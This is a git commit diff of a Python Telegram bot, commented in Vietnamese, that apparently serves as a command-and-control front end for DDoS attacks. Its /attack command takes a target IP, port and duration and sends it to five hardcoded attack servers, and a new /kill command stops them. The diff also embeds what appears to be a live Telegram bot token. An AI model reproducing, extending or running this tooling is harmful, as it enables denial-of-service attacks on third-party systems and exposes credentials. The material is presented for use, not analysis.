e0ca52041b4074519f6d2ebfc5c05c6538a41419
ZeronX <160329349+zeronxdev@users.noreply.github.com>
2024-04-08 20:57:21 +0700

    Update bot.py

--- bot/bot.py
+++ bot/bot.py
@@ -2,17 +2,47 @@ from telegram.ext import Updater, CommandHandler
 import requests
 import threading
 
-# Hàm xử lý lệnh /start
-def start(update, context):
-    update.message.reply_text("Hello User, Use /attack to sent attack")
+# Danh sách các ID người dùng được phép sử dụng lệnh /attack
+allowed_user_ids = {5561757248, 5519895288}
 
-# Hàm gửi yêu cầu đến một URL
+def start(update, context):
+    update.message.reply_text("Hello User, Use /attack to send attack")
+
 def send_request(url):
     requests.get(url)
 
-# Hàm xử lý lệnh /ddos
+def kill(update, context):
+    user_id = update.message.from_user.id
+    if user_id not in allowed_user_ids:
+        update.message.reply_text("Bạn không có quyền sử dụng lệnh này.")
+        return
+
+    url1 = f"http://152.42.211.83/?action=kill"
+    url2 = f"http://152.42.202.243/?action=kill"
+    url3 = f"http://128.199.84.155/?action=kill"
+    url4 = f"http://128.199.112.20/?action=kill"
+    url5 = f"http://152.42.165.62/?action=kill"
+
+    thread1 = threading.Thread(target=send_request, args=(url1,))
+    thread2 = threading.Thread(target=send_request, args=(url2,))
+    thread3 = threading.Thread(target=send_request, args=(url3,))
+    thread4 = threading.Thread(target=send_request, args=(url4,))
+    thread5 = threading.Thread(target=send_request, args=(url5,))
+    thread1.start()
+    thread2.start()
+    thread3.start()
+    thread4.start()
+    thread5.start()
+
+    print(f"Kill All DDoS Process")
+    update.message.reply_text(f"Kill All DDoS Process Success")
+
 def attack(update, context):
-    # Lấy thông tin từ tin nhắn
+    user_id = update.message.from_user.id
+    if user_id not in allowed_user_ids:
+        update.message.reply_text("Bạn không có quyền sử dụng lệnh này.")
+        return
+
     args = context.args
     if len(args) != 3:
         update.message.reply_text("Usage: /attack ip port time")
@@ -20,14 +50,12 @@ def attack(update, context):
 
     ip, port, time = args
 
-    # Tạo URL cho request GET
-    url1 = f"http://ip/?ip={ip}&port={port}&thread=100&time={time}"
-    url2 = f"http://ip/?ip={ip}&port={port}&thread=100&time={time}"
-    url3 = f"http://ip?ip={ip}&port={port}&thread=100&time={time}"
-    url4 = f"http://ip/?ip={ip}&port={port}&thread=100&time={time}"
-    url5 = f"http://ip/?ip={ip}&port={port}&thread=100&time={time}"
+    url1 = f"http://152.42.211.83/?ip={ip}&port={port}&thread=100&time={time}"
+    url2 = f"http://152.42.202.243/?ip={ip}&port={port}&thread=100&time={time}"
+    url3 = f"http://128.199.84.155/?ip={ip}&port={port}&thread=100&time={time}"
+    url4 = f"http://128.199.112.20/?ip={ip}&port={port}&thread=100&time={time}"
+    url5 = f"http://152.42.165.62/?ip={ip}&port={port}&thread=100&time={time}"
 
-    # Tạo và khởi chạy các luồng để gửi yêu cầu
     thread1 = threading.Thread(target=send_request, args=(url1,))
     thread2 = threading.Thread(target=send_request, args=(url2,))
     thread3 = threading.Thread(target=send_request, args=(url3,))
@@ -42,17 +70,12 @@ def attack(update, context):
     print(f"Attack {ip}:{port} in {time} second")
     update.message.reply_text(f"DDoS Attack Sent Success To {ip}:{port} in {time} second")
 
-# Hàm main
 def main():
-    # Khởi tạo Updater và Dispatcher
-    updater = Updater("token_bot_tele", use_context=True)
+    updater = Updater("5759600803:AAHbKQtzJznXGbvhuu7oU46bT31XohtIgz4", use_context=True)
     dp = updater.dispatcher
-
-    # Thêm các xử lý lệnh cho bot
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("attack", attack))
-
-    # Bắt đầu lắng nghe tin nhắn từ Telegram
+    dp.add_handler(CommandHandler("kill", kill))
     updater.start_polling()
     updater.idle()
 
